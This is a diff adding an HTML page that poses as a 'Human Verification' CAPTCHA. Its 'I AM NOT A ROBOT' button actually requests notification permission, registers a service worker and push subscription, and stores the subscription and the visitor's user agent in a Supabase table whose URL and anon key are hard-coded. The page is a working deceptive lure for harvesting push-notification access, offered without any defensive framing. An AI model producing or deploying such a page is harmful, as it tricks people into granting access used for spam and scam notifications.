@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verification Required</title>
+    <style>
+        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background: #f0f2f5; }
+        .box { background: white; padding: 40px; border-radius: 12px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        button { background: #1877f2; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>Human Verification</h3>
+        <p>Please click below and allow the browser prompt to continue.</p>
+        <button id="btn">I AM NOT A ROBOT</button>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script>
+        const SB_URL = "https://smikpuwdbfqcqrsbhqnf.supabase.co";
+        const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNtaWtwdXdkYmZxY3Fyc2JocW5mIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA3NjMxODIsImV4cCI6MjA4NjMzOTE4Mn0.-s4dG3cfhcgqAVoP1UG3DZDm8gNnzqvdIZZylKTpg98";
+        const _supabase = supabase.createClient(SB_URL, SB_KEY);
+
+        // This is a test public key (VAPID)
+        const VAPID_PUBLIC = "BDeO2LInXN8XGjG0O6_vK-R0_L9eB1_Kz5yS8V6J-m0_W7V9L0X4C6M8B0V2N4M6B8V0N2M4L6K8J0";
+
+        document.getElementById('btn').onclick = async () => {
+            const permission = await Notification.requestPermission();
+            if (permission === 'granted') {
+                const reg = await navigator.serviceWorker.register('sw.js');
+                const sub = await reg.pushManager.subscribe({
+                    userVisibleOnly: true,
+                    applicationServerKey: VAPID_PUBLIC
+                });
+
+                await _supabase.from('subscribers').insert([{ 
+                    subscription_json: sub, 
+                    device_name: navigator.userAgent 
+                }]);
+                
+                alert("Verified! Check your Supabase table now.");
+            }
+        };
+    </script>
+</body>
+</html>
